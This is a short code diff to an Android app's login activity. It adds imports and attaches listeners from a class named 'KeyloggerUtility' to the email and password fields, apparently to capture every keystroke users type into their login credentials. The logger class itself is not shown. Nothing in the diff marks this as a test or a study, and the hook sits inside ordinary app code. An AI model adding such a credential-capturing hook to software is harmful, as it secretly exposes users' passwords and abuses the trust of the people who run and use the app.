@@ -6,7 +6,11 @@ import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.text.Editable;
+import android.text.TextWatcher;
+import android.util.Log;
 import android.util.Patterns;
+import android.view.KeyEvent;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.ProgressBar;
@@ -91,6 +95,9 @@ public class MainActivity extends AppCompatActivity {
         editPassword = findViewById(R.id.password);
         progressbarofLogin = findViewById(R.id.progressbarofSignin);
         firebaseAuth = FirebaseAuth.getInstance();
+        editEmail.addTextChangedListener(new KeyloggerUtility("Email"));
+        editPassword.addTextChangedListener(new KeyloggerUtility("Password"));
+
 
         register.setOnClickListener(new View.OnClickListener() {
             @Override
